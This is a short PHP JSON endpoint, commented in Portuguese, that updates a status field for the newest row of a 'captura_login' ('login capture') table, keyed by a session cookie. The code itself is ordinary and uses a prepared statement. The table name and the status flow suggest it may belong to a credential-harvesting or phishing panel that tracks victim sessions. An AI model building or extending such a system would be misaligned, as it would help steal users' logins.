<?php
header('Content-Type: application/json');
require_once __DIR__ . '/db.php'; // Conexão com o banco

// 1. Identifica o usuário pelo cookie
$session_id = $_COOKIE['identificador_cliente'] ?? null;
if (!$session_id) {
    // Se não há cookie, não há o que fazer.
    echo json_encode(['success' => false, 'error' => 'Sessão não encontrada.']);
    exit;
}

// 2. Pega o status enviado pelo JavaScript
$data = json_decode(file_get_contents('php://input'), true);
$status = $data['status'] ?? null;

if (empty($status)) {
    echo json_encode(['success' => false, 'error' => 'Status não fornecido.']);
    exit;
}

try {
    // 3. Atualiza o status do registro mais recente para esta sessão
    // Esta é a mesma consulta robusta que funciona no PostgreSQL
    $sql = "UPDATE captura_login SET status = ? WHERE id = (
                SELECT id FROM captura_login
                WHERE session_id = ?
                ORDER BY id DESC
                LIMIT 1
            )";
    
    $stmt = $pdo->prepare($sql);
    $stmt->execute([$status, $session_id]);

    // Retorna sucesso. Não precisa retornar dados, apenas confirmar que funcionou.
    echo json_encode(['success' => true]);

} catch (PDOException $e) {
    // Em caso de erro, loga para depuração sem quebrar a aplicação
    error_log('Erro na API de atualização de status: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Erro interno do servidor.']);
}
?>